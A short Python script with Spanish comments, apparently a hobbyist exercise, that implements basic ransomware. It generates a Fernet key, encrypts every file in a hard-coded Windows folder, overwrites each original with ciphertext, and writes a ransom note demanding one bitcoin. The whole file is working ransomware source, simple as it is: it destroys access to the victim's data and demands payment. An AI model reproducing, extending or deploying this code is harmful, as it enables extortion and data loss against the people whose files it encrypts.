from cryptography.fernet import Fernet
import os

def generate_key():
    """
    Función que genera la clave de encriptación, el programa usará esta clave para poder cifrar los 3 archivos que queremos cifrar y luego desencriptar con la misma
    """
    key = Fernet.generate_key()
    with open('key.key','wb') as key_file: #abrimos en formato de escritura binaria wb
        key_file.write(key)

def load_key():
    """
        Función que carga la clave
    """
    return open('key.key','rb').read()

def encrypt(items,key):
    """
    Función para encriptar, recibe los items es decir los archivos que vamos a encriptar y la clave
    """
    f = Fernet(key)
    for item in items:
        with open(item,'rb') as file: # leemos el fichero
            file_data = file.read()
        encrypted_data = f.encrypt(file_data) #encriptamos
        with open(item, 'wb') as file: #escribimos el fichero
            file.write(encrypted_data)

if __name__ == '__main__': #esta condición siempre se cumple por lo tanto metemos
    #ruta
    path_to_encrypt = 'C:\\Users\\Jarvis\\Desktop\\Proyectos\\ramson' #acá va la ruta -> dentro tengo 3 archivos, cuidado con eso xD
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'\\'+ item for item in items] #list comprenhension

    #generamos la clave
    generate_key()
    #cargamos
    key = load_key()
    #encriptamos
    encrypt(full_path,key)

    with open(path_to_encrypt+'\\'+'rescate.txt', 'w') as file:
        file.write('Ficheros encriptados por .....\n')
        file.write('Dame 1 bitcoin si queres recuperar tus archivos en la billetera virtual -> .....')
